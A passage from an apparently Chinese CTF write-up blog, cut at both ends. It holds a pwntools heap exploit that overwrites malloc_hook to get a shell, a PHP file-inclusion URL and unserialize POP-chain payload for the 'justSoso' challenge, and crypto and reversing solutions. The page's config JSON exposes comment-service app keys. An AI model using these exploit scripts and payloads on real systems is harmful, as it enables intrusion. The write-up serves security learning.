class=\"hljs-string\">\"&gt; \"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"4\"</span>)\n\tp.recv()\n\tp.sendline(str(index))\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">exp</span><span class=\"hljs-params\">()</span>:</span> \n\tcreate(<span class=\"hljs-string\">\"1\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#0</span>\n\tcreate(<span class=\"hljs-string\">\"1\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#1</span>\n\tcreate(<span class=\"hljs-string\">\"2\"</span>*<span class=\"hljs-number\">0x60</span>) <span class=\"hljs-comment\">#2</span>\n\tcreate(<span class=\"hljs-string\">\"3\"</span>*<span class=\"hljs-number\">0x80</span>) <span class=\"hljs-comment\">#3</span>\n\tcreate(<span class=\"hljs-string\">\"3\"</span>*<span class=\"hljs-number\">0x80</span>) <span class=\"hljs-comment\">#4</span>\n\tfree(<span class=\"hljs-number\">3</span>)\n\tshow(<span class=\"hljs-number\">4</span>)\n\t<span class=\"hljs-keyword\">if</span> local:\n\t\t<span class=\"hljs-keyword\">pass</span>\n\t<span class=\"hljs-keyword\">else</span>:\n\t\t<span class=\"hljs-keyword\">pass</span>\n\t\t<span class=\"hljs-comment\">#p.recvuntil(\"Info index: \")</span>\n\t\t<span class=\"hljs-comment\">#p.recvuntil(\"Info index: \")</span>\n\tdata = u64(p.recvuntil(<span class=\"hljs-string\">\"\\n\"</span>,drop=<span class=\"hljs-keyword\">True</span>)+<span class=\"hljs-string\">\"\\x00\\x00\"</span>) libc_base = data - <span class=\"hljs-number\">0x3c4b78</span>\n\tmalloc_hook = libc_base + <span class=\"hljs-number\">0x3c4b10</span>\n\tone_shot = libc_base + <span class=\"hljs-number\">0xf02a4</span> print(<span class=\"hljs-string\">\"malloc_hook = \"</span> + str(hex(malloc_hook))) print(<span class=\"hljs-string\">\"one_shot = \"</span> + str(hex(one_shot))) free(<span class=\"hljs-number\">1</span>)\n\tfree(<span class=\"hljs-number\">2</span>)\n\tedit(<span class=\"hljs-number\">0</span>,p64(malloc_hook - <span class=\"hljs-number\">19</span>))\n\tcreate(<span class=\"hljs-string\">\"4\"</span>*<span class=\"hljs-number\">0x60</span>)\n\tcreate(<span class=\"hljs-string\">\"5\"</span>*<span class=\"hljs-number\">0x60</span>)\n\tpayload = <span class=\"hljs-string\">\"a\"</span>*<span class=\"hljs-number\">3</span> + p64(one_shot)\n\tpayload = payload.ljust(<span class=\"hljs-number\">0x60</span>,<span class=\"hljs-string\">\"\\x00\"</span>)\n\tcreate(payload)\n\tcreate(<span class=\"hljs-string\">\"icq0030af22ece42d03523c08138525f\"</span>)\n\tp.interactive()\nexp()</code></pre></p>\n<p><img src=\"/img/2019-04-23/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"></p>\n<h3 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h3><h4 id=\"justSoso\"><a href=\"#justSoso\" class=\"headerlink\" title=\"justSoso\"></a>justSoso</h4><p><code>http://d466a1d4c1214b3181516b834f0de419f413fd793ae942d0.changame.ichunqiu.com/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>通过文件包含拿到hint.php和index.php的源码<br><pre><code class=\"hljs php\"><span class=\"hljs-comment\">//index.php</span>\n&lt;html&gt;\n<span class=\"hljs-meta\">&lt;?php</span>\nerror_reporting(<span class=\"hljs-number\">0</span>); \n$file = $_GET[<span class=\"hljs-string\">\"file\"</span>]; \n$payload = $_GET[<span class=\"hljs-string\">\"payload\"</span>];\n<span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>($file))&#123;\n\t<span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">'Missing parameter'</span>.<span class=\"hljs-string\">'&lt;br&gt;'</span>;\n&#125;\n<span class=\"hljs-keyword\">if</span>(preg_match(<span class=\"hljs-string\">\"/flag/\"</span>,$file))&#123;\n\t<span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">'hack attacked!!!'</span>);\n&#125;\n@<span class=\"hljs-keyword\">include</span>($file);\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>($payload))&#123;  \n    $url = parse_url($_SERVER[<span class=\"hljs-string\">'REQUEST_URI'</span>]);\n    parse_str($url[<span class=\"hljs-string\">'query'</span>],$query);\n    <span class=\"hljs-keyword\">foreach</span>($query <span class=\"hljs-keyword\">as</span> $value)&#123;\n        <span class=\"hljs-keyword\">if</span> (preg_match(<span class=\"hljs-string\">\"/flag/\"</span>,$value)) &#123; \n    \t    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">'stop hacking!'</span>);\n    \t    <span class=\"hljs-keyword\">exit</span>();\n        &#125;\n    &#125;\n    $payload = unserialize($payload);\n&#125;<span class=\"hljs-keyword\">else</span>&#123; \n   <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"Missing parameters\"</span>; \n&#125; \n<span class=\"hljs-meta\">?&gt;</span>\n&lt;!--Please test index.php?file=xxx.php --&gt;\n&lt;!--Please get the source of hint.php--&gt;\n&lt;/html&gt;\n\n<span class=\"hljs-comment\">//hint.php</span>\n<span class=\"hljs-meta\">&lt;?php</span>  \n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Handle</span></span>&#123; \n    <span class=\"hljs-keyword\">private</span> $handle;  \n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__wakeup</span><span class=\"hljs-params\">()</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">foreach</span>(get_object_vars(<span class=\"hljs-keyword\">$this</span>) <span class=\"hljs-keyword\">as</span> $k =&gt; $v) &#123;\n            <span class=\"hljs-keyword\">$this</span>-&gt;$k = <span class=\"hljs-keyword\">null</span>;\n        &#125;\n        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"Waking up\\n\"</span>;\n    &#125;\n\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($handle)</span> </span>&#123; \n        <span class=\"hljs-keyword\">$this</span>-&gt;handle = $handle; \n    &#125; \n\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span><span class=\"hljs-params\">()</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;handle-&gt;getFlag();\n\t&#125;\n&#125;\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;\n    <span class=\"hljs-keyword\">public</span> $file;\n    <span class=\"hljs-keyword\">public</span> $token;\n    <span class=\"hljs-keyword\">public</span> $token_flag;\n \n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($file)</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;file = $file;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;token_flag = <span class=\"hljs-keyword\">$this</span>-&gt;token = md5(rand(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10000</span>));\n    &#125;\n    \n\t<span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getFlag</span><span class=\"hljs-params\">()</span></span>&#123;\n\t\t<span class=\"hljs-keyword\">$this</span>-&gt;token_flag = md5(rand(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10000</span>));\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">$this</span>-&gt;token === <span class=\"hljs-keyword\">$this</span>-&gt;token_flag)\n\t\t&#123;\n\t\t\t<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;\n\t\t\t\t<span class=\"hljs-keyword\">echo</span> @highlight_file(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-keyword\">true</span>); \n            &#125;  \n        &#125;\n    &#125;\n&#125;\n?</code></pre></p>\n<p>parse_url存在绕过的漏洞，例如：<code>http://127.0.0.1///index.php</code><br>构造payload<br><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Handle</span></span>&#123;\n    <span class=\"hljs-keyword\">private</span> $handle;\n\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($handle)</span> </span>&#123;\n        <span class=\"hljs-keyword\">$this</span>-&gt;handle = $handle;\n\n\n    &#125;\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__destruct</span><span class=\"hljs-params\">()</span></span>&#123;\n        <span class=\"hljs-keyword\">$this</span>-&gt;handle-&gt;getFlag();\n    &#125;\n&#125;\n\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">Flag</span></span>&#123;\n    <span class=\"hljs-keyword\">public</span> $file;\n    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">__construct</span><span class=\"hljs-params\">($file)</span></span>&#123;\n        <span class=\"hljs-keyword\">$this</span>-&gt;file = $file;\n    &#125;\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">getFlag</span><span class=\"hljs-params\">()</span></span>&#123;\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-keyword\">$this</span>-&gt;file))&#123;\n            <span class=\"hljs-keyword\">echo</span> @highlight_file(<span class=\"hljs-keyword\">$this</span>-&gt;file,<span class=\"hljs-keyword\">true</span>);\n        &#125;\n    &#125;\n&#125;\n\n$flag = <span class=\"hljs-keyword\">new</span> Flag(<span class=\"hljs-string\">'flag.php'</span>);\n$flag -&gt;token = &amp;$flag -&gt; token_flag;\n$exp = <span class=\"hljs-keyword\">new</span> Handle($flag);\n<span class=\"hljs-keyword\">echo</span> urlencode(serialize($exp)).PHP_EOL;\n<span class=\"hljs-meta\">?&gt;</span></code></pre></p>\n<p>得到以下payload<br><pre><code class=\"hljs undefined\">O<span class=\"hljs-meta\">%3A6</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A1</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A14</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%00Handle</span><span class=\"hljs-meta\">%00handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BO</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A3</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22file</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A8</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22flag</span>.php<span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A10</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token_flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BN</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A5</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BR</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3B</span><span class=\"hljs-meta\">%7D</span><span class=\"hljs-meta\">%7D</span>\n\nurldecode:\nO:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"Handle\"</span>:<span class=\"hljs-number\">1</span>:&#123;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\".Handle.handle\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Flag\"</span>:<span class=\"hljs-number\">3</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"file\"</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"flag.php\"</span>;s:<span class=\"hljs-number\">10</span>:<span class=\"hljs-string\">\"token_flag\"</span>;N;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"token\"</span>;R:<span class=\"hljs-number\">4</span>;&#125;&#125;</code></pre></p>\n<p>还要把一个的1改为2，不然会跳进Waking up函数<br><pre><code class=\"hljs undefined\">O<span class=\"hljs-meta\">%3A6</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A2</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A14</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%00Handle</span><span class=\"hljs-meta\">%00handle</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BO</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22Flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3A3</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%7Bs</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22file</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A8</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22flag</span>.php<span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A10</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token_flag</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BN</span><span class=\"hljs-meta\">%3Bs</span><span class=\"hljs-meta\">%3A5</span><span class=\"hljs-meta\">%3A</span><span class=\"hljs-meta\">%22token</span><span class=\"hljs-meta\">%22</span><span class=\"hljs-meta\">%3BR</span><span class=\"hljs-meta\">%3A4</span><span class=\"hljs-meta\">%3B</span><span class=\"hljs-meta\">%7D</span><span class=\"hljs-meta\">%7D</span>\n\nurldecode:\nO:<span class=\"hljs-number\">6</span>:<span class=\"hljs-string\">\"Handle\"</span>:<span class=\"hljs-number\">2</span>:&#123;s:<span class=\"hljs-number\">14</span>:<span class=\"hljs-string\">\".Handle.handle\"</span>;O:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"Flag\"</span>:<span class=\"hljs-number\">3</span>:&#123;s:<span class=\"hljs-number\">4</span>:<span class=\"hljs-string\">\"file\"</span>;s:<span class=\"hljs-number\">8</span>:<span class=\"hljs-string\">\"flag.php\"</span>;s:<span class=\"hljs-number\">10</span>:<span class=\"hljs-string\">\"token_flag\"</span>;N;s:<span class=\"hljs-number\">5</span>:<span class=\"hljs-string\">\"token\"</span>;R:<span class=\"hljs-number\">4</span>;&#125;&#125;</code></pre></p>\n<p><img src=\"/img/2019-04-23/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h3 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h3><h4 id=\"puzzle\"><a href=\"#puzzle\" class=\"headerlink\" title=\"puzzle\"></a>puzzle</h4><h5 id=\"question-0\"><a href=\"#question-0\" class=\"headerlink\" title=\"question-0\"></a>question-0</h5><p><img src=\"/img/2019-04-23/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br><pre><code class=\"hljs undefined\"><span class=\"hljs-symbol\">a1:</span><span class=\"hljs-number\">0xfa6</span>\n\n<span class=\"hljs-symbol\">a2:</span><span class=\"hljs-number\">0xbed</span>\n\n<span class=\"hljs-symbol\">a3:</span><span class=\"hljs-number\">0x9c7</span>\n\n<span class=\"hljs-symbol\">a4:</span><span class=\"hljs-number\">0xa00</span></code></pre></p>\n<h5 id=\"part1\"><a href=\"#part1\" class=\"headerlink\" title=\"part1\"></a>part1</h5><p>看到这三个数都是素数，猜想part1也可能是素数。google到如下的素数表<br><img src=\"/img/2019-04-23/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>猜测part1所在位置，根据素数之间的间隔相等的原则，猜出part1为26365399</p>\n<h5 id=\"part2\"><a href=\"#part2\" class=\"headerlink\" title=\"part2\"></a>part2</h5><p><img src=\"/img/2019-04-23/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>脚本也可解：<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> sympy <span class=\"hljs-keyword\">as</span> sy\nx = sy.symbols(<span class=\"hljs-string\">'x'</span>)\nprint(sy.integrate(sy.exp(x)*pow(<span class=\"hljs-number\">4</span> + sy.exp(x),<span class=\"hljs-number\">2</span>), (x, float(<span class=\"hljs-number\">0</span>), sy.log(<span class=\"hljs-number\">2</span>)))) \nrerult : <span class=\"hljs-number\">30.3333333333333</span>\n(<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">30.3333333</span>≈<span class=\"hljs-number\">9</span>*<span class=\"hljs-number\">31</span>+<span class=\"hljs-number\">7</span>+<span class=\"hljs-number\">1</span>)=<span class=\"hljs-number\">100</span>\npart2 = （<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">91</span>+<span class=\"hljs-number\">7</span>+<span class=\"hljs-number\">1</span>）*<span class=\"hljs-number\">77</span> =<span class=\"hljs-number\">7700</span>\nhex(<span class=\"hljs-number\">7700</span>)=<span class=\"hljs-number\">0x1e14</span></code></pre></p>\n<h5 id=\"part3\"><a href=\"#part3\" class=\"headerlink\" title=\"part3\"></a>part3</h5><p><img src=\"/img/2019-04-23/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br><img src=\"/img/2019-04-23/14.png\" srcset=\"/img/static/loading.gif\" alt=\"14\"><br>part3 = 0x48d0</p>\n<h5 id=\"part4\"><a href=\"#part4\" class=\"headerlink\" title=\"part4\"></a>part4</h5><p><img src=\"/img/2019-04-23/15.png\" srcset=\"/img/static/loading.gif\" alt=\"15\"><br><img src=\"/img/2019-04-23/16.png\" srcset=\"/img/static/loading.gif\" alt=\"16\"><br>part 4 =hex(40320)=0x9d80</p>\n<h4 id=\"warmup\"><a href=\"#warmup\" class=\"headerlink\" title=\"warmup\"></a>warmup</h4><p>本题是AES_CTR加密，而这个加密方式就是分组对明文进行异或，因为在同一次通信中其中的key和计数器不变，所以明文异或的密钥不会变，因此我们可以在通信过程可以通过输入不同的填充获得密钥。经过测试可以发现，32 个一个分组，flag有两个分组多一些，可以先填充5个让flag加填充满足有3_32个，得到第一个需要的密文data1，然后填充5+48获得第二个密文，第二个密文(data2)有6_32个bit。<br>则详细脚本如下：<br><pre><code class=\"hljs python\">data1 = <span class=\"hljs-string\">\"aefdd88c71194ba242a1e45c7a03f1e8715e11c3566607ee614c8cd4541f3688f0e5a35146b5cca393c8432dafdccee7\"</span> \n\ndata2 = <span class=\"hljs-string\">\"aefdd88c711e46a244bbbc0d2d51f1bb26085d90026603a234188c86184734dff4a9f40244e4c8a0c3cd407eab84d287ec9ece135f9a2a6bc7d427cd18e7c7995985df9d61d1b697d5472b073c27a6b0d5245917d3b1965248a6c228d6f260d4\"</span>\ns1 = [data1[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">32</span>],data1[<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>],data1[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">3</span>]]\ns2 = [data2[<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">32</span>],data2[<span class=\"hljs-number\">32</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>],data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">3</span>],data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">4</span>],data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">5</span>], data2[<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">32</span>*<span class=\"hljs-number\">6</span>]]\nming=<span class=\"hljs-string\">\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"</span>\nminghex=ming.encode(<span class=\"hljs-string\">\"hex\"</span>)\nkey1=int(s1[<span class=\"hljs-number\">0</span>],<span class=\"hljs-number\">16</span>)^int(minghex,<span class=\"hljs-number\">16</span>)\nkey2=int(s1[<span class=\"hljs-number\">1</span>],<span class=\"hljs-number\">16</span>)^int(minghex,<span class=\"hljs-number\">16</span>)\nkey3=int(s1[<span class=\"hljs-number\">2</span>],<span class=\"hljs-number\">16</span>)^int(minghex,<span class=\"hljs-number\">16</span>)\nminghex0=int(s2[<span class=\"hljs-number\">0</span>],<span class=\"hljs-number\">16</span>)^key1\nminghex1=int(s2[<span class=\"hljs-number\">1</span>],<span class=\"hljs-number\">16</span>)^key2\nminghex2=int(s2[<span class=\"hljs-number\">2</span>],<span class=\"hljs-number\">16</span>)^key3\n<span class=\"hljs-keyword\">print</span> hex(minghex0)[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">-1</span>].decode(<span class=\"hljs-string\">\"hex\"</span>)\n<span class=\"hljs-keyword\">print</span> hex(minghex1)[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">-1</span>].decode(<span class=\"hljs-string\">\"hex\"</span>)\n<span class=\"hljs-keyword\">print</span> hex(minghex2)[<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">-1</span>].decode(<span class=\"hljs-string\">\"hex\"</span>)</code></pre></p>\n<p><img src=\"/img/2019-04-23/17.png\" srcset=\"/img/static/loading.gif\" alt=\"17\"></p>\n<h4 id=\"Asymmetric\"><a href=\"#Asymmetric\" class=\"headerlink\" title=\"Asymmetric\"></a>Asymmetric</h4><p>看了一 下题目给的脚本，其实就是普通的RSA题 ,主要还是把<strong>n</strong>分解<br><img src=\"/img/2019-04-23/18.png\" srcset=\"/img/static/loading.gif\" alt=\"18\"><br>剩下就 很简单了<br><img src=\"/img/2019-04-23/19.png\" srcset=\"/img/static/loading.gif\" alt=\"19\"></p>\n<h3 id=\"Re\"><a href=\"#Re\" class=\"headerlink\" title=\"Re\"></a>Re</h3><h4 id=\"EasyGo\"><a href=\"#EasyGo\" class=\"headerlink\" title=\"EasyGo\"></a>EasyGo</h4><p>查看可执行文件格式<br><img src=\"/img/2019-04-23/20.png\" srcset=\"/img/static/loading.gif\" alt=\"20\"><br>程序为Go语言编写,内部函数较为复杂，直接IDA动态调试，定位到<code>sub_495150</code>函数，执行完<code>sub_4886B0</code>,程序打印了字符串<br><img src=\"/img/2019-04-23/21.png\" srcset=\"/img/static/loading.gif\" alt=\"21\"><br>在<code>sub_48EB00</code>中, 程序调用了输入函数，继续执行，发现函数将一串字符串地址放到了<code>rax</code>，并在接下来的几个<code>CALL</code>中，对其进行了一些操作，这里没有仔细跟进，由于在<code>sub_47E620</code>函数处存在跳转,猜测这里可能为相关的<code>check</code>函数，重点关注其所对应的内存区域，可发现，执行完<code>sub_47E620</code>函数后,可以在内存中直接拿到flag</p>\n","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 字"},"min2read":{"enable":true,"format":"阅读时长:{} 分钟","words":100},"views":{"enable":false,"source":"leancloud","format":"{} 次"}},"updated":{"enable":false,"content":"本文最后更新于：","relative":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"copyright":{"enable":true,"content":"本博客所有文章除特别声明外，均采用 <a href=\"https://creativecommons.org/licenses/by-sa/4.0/deed.zh\" rel=\"nofollow noopener\">CC BY-SA 4.0 协议</a> ，转载请注明出处！"},"prev_next":{"enable":true},"custom":{"enable":false,"content":"<img src=\"https://octodex.github.com/images/jetpacktocat.png\" class=\"rounded mx-auto d-block mt-5\" style=\"width:150px; height:150px;\">"},"image_zoom":{"enable":true},"footnote":{"enable":true,"header":""},"math":{"enable":false,"specific":false,"engine":"mathjax"},"mermaid":{"enable":false,"specific":false,"options":{"theme":"default"}},"comments":{"enable":true,"type":"valine"}},"utterances":{"repo":null,"issue_term":"pathname","label":"utterances","theme":"github-light","theme_dark":"github-dark","crossorigin":"anonymous"},"disqus":{"shortname":null,"disqusjs":false,"apikey":null},"gitalk":{"clientID":null,"clientSecret":null,"repo":null,"owner":null,"admin":["name"],"id":"location.pathname","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true},"valine":{"appid":"6PEfc93t6icHph8NMpSh0OFO-gzGzoHsz","appkey":"i3vUWkHRRkiiS7LuUpuIm1E5","placeholder":"说些什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"sRx9dQVqzL65gdhuYexJtTPF"},"changyan":{"appid":"","appkey":""},"livere":{"uid":""},"remark4